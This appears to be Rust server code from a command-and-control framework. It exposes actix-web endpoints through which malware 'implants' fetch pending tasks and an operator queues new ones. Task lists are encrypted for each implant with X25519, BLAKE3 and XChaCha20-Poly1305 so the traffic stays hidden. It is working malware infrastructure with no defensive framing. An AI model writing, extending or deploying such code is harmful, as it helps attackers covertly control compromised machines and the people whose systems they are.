use actix_web::{get, post, web, HttpResponse, Responder};
use arrayvec::ArrayVec;
use base64;
use bincode;
use diesel::prelude::*;
use uuid;
use x25519_dalek;

use crate::db::connect::Pool;
use crate::errors::ServerError;
use crate::models::{implant, task};
use crate::utils::network_encryption;

#[get("/api/tasks/{implant_id}")]
pub async fn implant_tasks(
    db: web::Data<Pool>,
    path: web::Path<String>,
) -> Result<impl Responder, ServerError> {
    let implant_id = path.into_inner();

    // Get only tasks from db that belongs to received implant id
    let (implant, tasks) = web::block(move || get_implant_tasks(db, implant_id)).await??;

    let mut response_tasks: Vec<task::ResponseTask> = vec![];

    for task in tasks {
        // Show only tasks that are not answered yet
        if task.task_status == "created".to_owned() {
            let response_task =
                task::ResponseTask::new(task.task_id, task.value, task.task, task.implant_id);
            response_tasks.push(response_task);
        }
    }

    // Implement XChaCha20-Poly1305 for encrypted communication
    // Convert base64 to [u8; 32]
    let server_private_key_base64 = implant.server_private_key;
    let implant_public_key_base64 = implant.public_key;

    let server_private_key_vec = base64::decode(server_private_key_base64)?;
    let server_private_key_bytes: ArrayVec<u8, 32> = server_private_key_vec.into_iter().collect();
    let server_private_key_bytes = server_private_key_bytes.into_inner()?;

    let implant_public_key_vec = base64::decode(implant_public_key_base64)?;
    let implant_public_key_bytes: ArrayVec<u8, 32> = implant_public_key_vec.into_iter().collect();
    let implant_public_key_bytes = implant_public_key_bytes.into_inner()?;

    let server_private_key = x25519_dalek::StaticSecret::from(server_private_key_bytes);
    let implant_public_key = x25519_dalek::PublicKey::from(implant_public_key_bytes);

    // Generate x25519 shared secret
    let x25519_shared_secret =
        network_encryption::generate_shared_secret(server_private_key, implant_public_key);

    // Generate BLAKE3 hashed key
    let blake3_hashed_key = network_encryption::blake3_hash_key(x25519_shared_secret.as_bytes());

    // Encrypt message (XChaCha20Poly1305)
    let encoded_tasks = bincode::serialize(&response_tasks).expect("Vector encode error");
    let (encrypted_message, nonce) =
        network_encryption::xchacha20poly1305_encrypt_message(blake3_hashed_key, &encoded_tasks);

    // Base64 encode encrypted response byte array
    let base64_encrypted_message = base64::encode(encrypted_message);

    // Base64 encode nonce
    let base64_nonce = base64::encode(nonce);

    let response = format!("{}\n{}", base64_encrypted_message, base64_nonce);

    Ok(HttpResponse::Ok().body(response))
}

fn get_implant_tasks(
    db: web::Data<Pool>,
    implant_id: String,
) -> Result<(implant::Implant, Vec<task::Task>), ServerError> {
    use crate::schema::implants::dsl::implants;

    let conn = db.get()?;

    let implant_id = uuid::Uuid::parse_str(&implant_id)?;

    let implant = implants
        .find(implant_id)
        .get_result::<implant::Implant>(&conn)?;

    let implant_tasks_vec = task::Task::belonging_to(&implant).load::<task::Task>(&conn)?;

    Ok((implant, implant_tasks_vec))
}

#[get("/tasks")]
pub async fn tasks_get(db: web::Data<Pool>) -> Result<impl Responder, ServerError> {
    // Get all tasks for all implants from db
    let tasks = web::block(move || get_all_tasks(db)).await??;

    let response = task::AllTasksResponse::new(tasks);

    // Return json with all tasks in vector
    Ok(HttpResponse::Ok().json(response))
}

fn get_all_tasks(db: web::Data<Pool>) -> Result<Vec<task::Task>, ServerError> {
    use crate::schema::tasks::dsl::tasks;

    let conn = db.get()?;

    let results = tasks.load::<task::Task>(&conn)?;

    Ok(results)
}

#[post("/tasks")]
pub async fn tasks_post(
    db: web::Data<Pool>,
    req_body: web::Json<task::AddTaskRequest>,
) -> Result<impl Responder, ServerError> {
    web::block(move || add_task(db, req_body)).await??;

    Ok(HttpResponse::Ok().finish())
}

fn add_task(
    db: web::Data<Pool>,
    req_body: web::Json<task::AddTaskRequest>,
) -> Result<(), ServerError> {
    use crate::schema::tasks::dsl::tasks;

    let conn = db.get()?;

    let req_body = req_body.into_inner();

    let value = if req_body.value.is_empty() {
        None
    } else {
        Some(req_body.value)
    };

    let task = task::Task::new(
        req_body.task,
        value,
        "created".to_owned(),
        req_body.implant_id,
    );

    diesel::dsl::insert_into(tasks)
        .values(&task)
        .execute(&conn)?;

    Ok(())
}
